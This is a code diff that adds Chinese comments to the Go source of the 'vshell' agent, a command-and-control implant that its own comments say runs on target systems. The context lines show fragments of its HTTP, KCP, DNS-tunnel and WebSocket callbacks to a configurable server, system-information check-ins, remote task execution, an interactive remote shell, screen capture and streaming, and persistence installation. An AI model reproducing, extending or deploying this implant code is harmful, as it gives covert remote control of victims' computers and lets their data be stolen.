@@ -1,3 +1,4 @@
+// Package agent 实现运行在目标系统上的 vshell Agent，支持 HTTP、DNS、KCP 与 WebSocket 传输模式。
 // Package agent implements the vshell agent that runs on target systems.
 // Supports HTTP, DNS, KCP, and WebSocket transport modes.
 //
@@ -37,6 +38,7 @@ import (
 
 // ============================================================================
 // Embedded Configuration (patched at build time via ldflags)
+// 嵌入式配置（构建时通过 ldflags 修补）
 // ============================================================================
 var (
 	ServerAddr  = "REPLACE_SERVER_ADDR___XXXXXXXXXXXXXXXXXXXXXXXX"
@@ -102,8 +104,11 @@ func init() {
 
 // ============================================================================
 // System info gathering
+// 系统信息收集
 // ============================================================================
 
+// SysInfo 保存 Agent 上报的系统信息。
+// SysInfo holds the system info reported by the agent.
 type SysInfo struct {
 	Hostname    string   `json:"hostname"`
 	Username    string   `json:"username"`
@@ -119,6 +124,8 @@ type SysInfo struct {
 	GoVersion   string   `json:"go_version"`
 }
 
+// getSysInfo 收集并返回系统信息。
+// getSysInfo collects and returns system info.
 func getSysInfo() *SysInfo {
 	info := &SysInfo{
 		Hostname:    hostname,
@@ -150,6 +157,8 @@ func getSysInfo() *SysInfo {
 	return info
 }
 
+// isWindowsAdmin 判断当前是否以管理员权限运行。
+// isWindowsAdmin reports whether the process runs with administrator privileges.
 func isWindowsAdmin() bool {
 	f, err := os.Open("\\\\.\\PHYSICALDRIVE0")
 	if err != nil {
@@ -161,8 +170,11 @@ func isWindowsAdmin() bool {
 
 // ============================================================================
 // AES Encryption
+// AES 加密
 // ============================================================================
 
+// encrypt 使用派生密钥加密数据。
+// encrypt encrypts data with the derived AES key.
 func encrypt(plaintext []byte) ([]byte, error) {
 	if aesKey == nil {
 		return plaintext, nil
@@ -180,6 +192,8 @@ func encrypt(plaintext []byte) ([]byte, error) {
 	return gcm.Seal(nonce, nonce, plaintext, nil), nil
 }
 
+// decrypt 使用派生密钥解密数据。
+// decrypt decrypts data with the derived AES key.
 func decrypt(ciphertext []byte) ([]byte, error) {
 	if aesKey == nil {
 		return ciphertext, nil
@@ -201,8 +215,11 @@ func decrypt(ciphertext []byte) ([]byte, error) {
 
 // ============================================================================
 // Transport interface and implementations
+// 传输接口与实现
 // ============================================================================
 
+// Transport 抽象不同 C2 传输模式（HTTP/KCP/DNS/WebSocket）。
+// Transport abstracts the different C2 transport modes (HTTP/KCP/DNS/WebSocket).
 type Transport interface {
 	Checkin() (*CheckinResponse, error)
 	GetTasks() ([]TaskItem, error)
@@ -211,12 +228,15 @@ type Transport interface {
 }
 
 // --- HTTP Transport ---
+// HTTP 传输
 
 type httpTransport struct {
 	serverURL string
 	client    *http.Client
 }
 
+// newHTTPTransport 创建 HTTP 传输。
+// newHTTPTransport creates an HTTP transport.
 func newHTTPTransport(url string) *httpTransport {
 	return &httpTransport{
 		serverURL: strings.TrimRight(url, "/"),
@@ -224,6 +244,8 @@ func newHTTPTransport(url string) *httpTransport {
 	}
 }
 
+// postJSON 向服务器发送 JSON 请求。
+// postJSON sends a JSON request to the server.
 func (t *httpTransport) postJSON(path string, data []byte) (*http.Response, error) {
 	body := data
 	if aesKey != nil {
@@ -233,6 +255,8 @@ func (t *httpTransport) postJSON(path string, data []byte) (*http.Response, erro
 	return t.client.Post(t.serverURL+path, "application/json", bytes.NewReader(body))
 }
 
+// Checkin 执行 Agent 签到。
+// Checkin performs the agent check-in.
 func (t *httpTransport) Checkin() (*CheckinResponse, error) {
 	req := CheckinRequest{
 		VerifyKey:   VerifyKey,
@@ -263,6 +287,8 @@ func (t *httpTransport) Checkin() (*CheckinResponse, error) {
 	return &cr, nil
 }
 
+// GetTasks 轮询待处理任务。
+// GetTasks polls for pending tasks.
 func (t *httpTransport) GetTasks() ([]TaskItem, error) {
 	url := fmt.Sprintf("%s/api/tasks?client_id=%d&verify_key=%s", t.serverURL, clientID, url.QueryEscape(VerifyKey))
 	resp, err := t.client.Get(url)
@@ -281,6 +307,8 @@ func (t *httpTransport) GetTasks() ([]TaskItem, error) {
 	return tr.Tasks, nil
 }
 
+// SendResult 回传任务结果。
+// SendResult submits a task result.
 func (t *httpTransport) SendResult(taskID int64, result, status string) error {
 	req := ResultRequest{
 		ClientID:  clientID,
@@ -298,9 +326,13 @@ func (t *httpTransport) SendResult(taskID int64, result, status string) error {
 	return nil
 }
 
+// Close 关闭 HTTP 传输（无状态，空操作）。
+// Close closes the HTTP transport (stateless, no-op).
 func (t *httpTransport) Close() error { return nil }
 
 // --- KCP Transport ---
+// KCP 传输：服务器 KCP 监听器（c2engine/kcp.go）是带 AES 块加密 + FEC 的 kcp-go UDP
+// 监听器，Agent 必须使用相同的线协议：
 //
 // The server's KCP listener (c2engine/kcp.go) is a kcp-go UDP listener with
 // AES block crypt + FEC. The agent must speak the same wire protocol:
@@ -317,12 +349,16 @@ const (
 	linkMsgClose  = 0x05 // close connection
 )
 
+// kcpTransport 是基于 KCP 的传输实现。
+// kcpTransport is the KCP-based transport implementation.
 type kcpTransport struct {
 	serverAddr string
 	sess       *kcp.UDPSession
 	mu         sync.Mutex
 }
 
+// newKCPTransport 创建 KCP 传输。
+// newKCPTransport creates a KCP transport.
 func newKCPTransport(addr string) *kcpTransport {
 	return &kcpTransport{serverAddr: addr}
 }
@@ -339,6 +375,8 @@ func kcpBlockCrypt(salt, key string) kcp.BlockCrypt {
 	return block
 }
 
+// connect 建立 KCP 会话。
+// connect establishes the KCP session.
 func (t *kcpTransport) connect() error {
 	if t.sess != nil {
 		t.sess.Close()
@@ -363,6 +401,7 @@ func (t *kcpTransport) connect() error {
 // into fragments and reassembled server-side.
 const maxKCPFrame = 60000
 
+// writeFrame 发送类型化、长度前缀消息（链路协议）。
 // writeFrame sends a typed, length-prefixed message (link protocol).
 func (t *kcpTransport) writeFrame(msgType byte, data []byte) error {
 	if t.sess == nil {
@@ -388,6 +427,9 @@ func (t *kcpTransport) writeFrame(msgType byte, data []byte) error {
 	return nil
 }
 
+// writeFragmented 将超大载荷（如截图或屏幕帧）拆分为 maxKCPFrame 大小的分片，
+// 每个分片是携带 {"_frag":k,"_total":n,"_data":<base64 chunk>} 的 LinkMsgMain
+// 帧，服务器在处理前重组。
 // writeFragmented splits an oversized payload (e.g. a screenshot or screen
 // frame) into maxKCPFrame-sized fragments. Each fragment is a LinkMsgMain
 // frame carrying {"_frag":k,"_total":n,"_data":<base64 chunk>}; the server
@@ -425,6 +467,7 @@ func (t *kcpTransport) writeFragmented(data []byte) error {
 	return nil
 }
 
+// readFrame 读取一条类型化、长度前缀消息，跳过服务器心跳（服务器每 10 秒推送 LinkMsgHealth）。
 // readFrame reads one typed, length-prefixed message, skipping server
 // heartbeats (the server pushes LinkMsgHealth every 10s on its own).
 func (t *kcpTransport) readFrame() (byte, []byte, error) {
@@ -538,20 +581,27 @@ func (t *kcpTransport) Close() error {
 }
 
 // --- DNS Transport ---
+// DNS 传输
 
 type dnsTransport struct {
 	domain string
 }
 
+// newDNSTransport 创建 DNS 传输。
+// newDNSTransport creates a DNS transport.
 func newDNSTransport(domain string) *dnsTransport {
 	return &dnsTransport{domain: domain}
 }
 
+// dnsQuery 发送 DNS 查询并返回 TXT 记录。
+// dnsQuery sends a DNS query and returns TXT records.
 func (t *dnsTransport) dnsQuery(subdomain string) ([]string, error) {
 	query := subdomain + "." + t.domain
 	return net.LookupTXT(query)
 }
 
+// Checkin 通过 DNS 执行签到。
+// Checkin performs the check-in over DNS.
 func (t *dnsTransport) Checkin() (*CheckinResponse, error) {
 	data := hex.EncodeToString([]byte(fmt.Sprintf("checkin:%s|%s|%s", hostname, username, runtime.GOOS)))
 	if _, err := t.dnsQuery(data); err != nil {
@@ -560,6 +610,8 @@ func (t *dnsTransport) Checkin() (*CheckinResponse, error) {
 	return &CheckinResponse{Status: "ok", Interval: 10}, nil
 }
 
+// GetTasks 通过 DNS 轮询任务。
+// GetTasks polls tasks over DNS.
 func (t *dnsTransport) GetTasks() ([]TaskItem, error) {
 	txts, err := t.dnsQuery(fmt.Sprintf("task.%d", clientID))
 	if err != nil {
@@ -580,6 +632,8 @@ func (t *dnsTransport) GetTasks() ([]TaskItem, error) {
 	return tasks, nil
 }
 
+// SendResult 通过 DNS 回传任务结果。
+// SendResult submits a task result over DNS.
 func (t *dnsTransport) SendResult(taskID int64, result, status string) error {
 	data := hex.EncodeToString([]byte(fmt.Sprintf("result:%d:%s", taskID, result)))
 	_, err := t.dnsQuery(data)
@@ -589,12 +643,17 @@ func (t *dnsTransport) SendResult(taskID int64, result, status string) error {
 	return nil
 }
 
+// Close 关闭 DNS 传输（无状态，空操作）。
+// Close closes the DNS transport (stateless, no-op).
 func (t *dnsTransport) Close() error { return nil }
 
 // ============================================================================
 // Message types
+// 协议消息类型
 // ============================================================================
 
+// CheckinRequest 是签到请求。
+// CheckinRequest is the check-in request.
 type CheckinRequest struct {
 	VerifyKey   string `json:"verify_key"`
 	HostName    string `json:"hostname"`
@@ -607,6 +666,8 @@ type CheckinRequest struct {
 	Version     string `json:"version,omitempty"`
 }
 
+// CheckinResponse 是签到响应。
+// CheckinResponse is the check-in response.
 type CheckinResponse struct {
 	Status    string `json:"status"`
 	ClientID  int64  `json:"client_id"`
@@ -616,17 +677,23 @@ type CheckinResponse struct {
 	Message   string `json:"message,omitempty"`
 }
 
+// TaskResponse 是任务轮询响应。
+// TaskResponse is the task polling response.
 type TaskResponse struct {
 	Tasks    []TaskItem `json:"tasks"`
 	Interval int        `json:"interval"`
 }
 
+// TaskItem 是单条任务。
+// TaskItem is a single task.
 type TaskItem struct {
 	ID      int64  `json:"id"`
 	Command string `json:"command"`
 	Timeout int    `json:"timeout"`
 }
 
+// ResultRequest 是结果回传请求。
+// ResultRequest is the result submission request.
 type ResultRequest struct {
 	ClientID  int64  `json:"client_id"`
 	CommandID int64  `json:"command_id"`
@@ -639,6 +706,7 @@ type ResultRequest struct {
 
 // ============================================================================
 // Command execution
+// 命令执行
 // ============================================================================
 
 const (
@@ -669,6 +737,7 @@ const (
 
 // ============================================================================
 // Interactive remote terminal session
+// 交互式远程终端会话
 //
 // The web panel's terminal relays to the agent via these commands:
 //   terminal_start type=<bash|sh|cmd> rows=N cols=M
@@ -679,6 +748,8 @@ const (
 // to the browser's terminal WebSocket live).
 // ============================================================================
 
+// agentTermSession 保存交互式终端会话状态。
+// agentTermSession holds interactive terminal session state.
 type agentTermSession struct {
 	mu       sync.Mutex
 	cmd      *exec.Cmd
@@ -846,6 +917,7 @@ func terminalClose() (string, string) {
 
 // ============================================================================
 // Screen capture streaming
+// 屏幕捕获流
 //
 //   screen_capture_start quality=N fps=M
 //   screen_capture_stop      screen_capture_quality=N   screen_capture_fps=N
@@ -854,6 +926,8 @@ func terminalClose() (string, string) {
 // results; the server relays them (as binary) to the screen viewer WebSocket.
 // ============================================================================
 
+// agentScreenCapture 保存屏幕捕获流状态。
+// agentScreenCapture holds screen capture streaming state.
 type agentScreenCapture struct {
 	mu     sync.Mutex
 	stop   chan struct{}
@@ -1290,6 +1364,7 @@ func getPSCmd() string {
 
 // ============================================================================
 // Persistence
+// 持久化（开机自启动）
 // ============================================================================
 
 func installPersistence() (string, string) {
@@ -1345,6 +1420,7 @@ func removePersistence() (string, string) {
 
 // ============================================================================
 // Screenshot capture (platform-specific)
+// 截图捕获（平台相关）
 // ============================================================================
 
 func captureScreenshot() (string, string) {
@@ -1402,8 +1478,12 @@ func linuxScreenshot() (string, string) {
 
 // ============================================================================
 // Main loop
+// 主循环
 // ============================================================================
 
+// main 是 Agent 的入口：加载配置、启动传输、进入签到/任务循环。
+// main is the agent entry point: loads config, starts transport, and runs the
+// check-in/task loop.
 func main() {
 	log.Printf("VShell Agent v%s starting (%s/%s)", agentVersion, runtime.GOOS, runtime.GOARCH)
 	log.Printf("Host: %s, User: %s, PID: %d", hostname, username, pid)
@@ -1502,6 +1582,7 @@ func main() {
 
 // ============================================================================
 // Helpers
+// 辅助函数
 // ============================================================================
 
 func filepathBase(path string) string {
